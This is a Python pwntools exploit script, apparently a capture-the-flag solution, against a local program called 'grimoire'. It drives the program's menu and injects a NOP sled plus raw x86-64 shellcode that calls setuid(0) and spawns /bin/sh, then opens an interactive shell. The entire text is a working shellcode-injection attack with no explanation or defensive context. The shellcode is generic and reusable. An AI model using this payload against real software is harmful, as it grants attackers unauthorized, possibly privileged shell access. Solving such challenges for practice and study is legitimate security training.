from pwn import *

exe = './grimoire'
elf = context.binary = ELF(exe, checksec=False)

def main():
    p = process(exe)

    p.sendlineafter(b"> ", b"1")

    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"max): ", b"Voldemort")

    shellcode = b"\x31\xff\x6a\x69\x58\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
    payload = b"\x90" * 60 + shellcode

    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"max): ", payload)

    p.sendlineafter(b"> ", b"2")

    p.interactive()

if __name__ == "__main__":
    main()
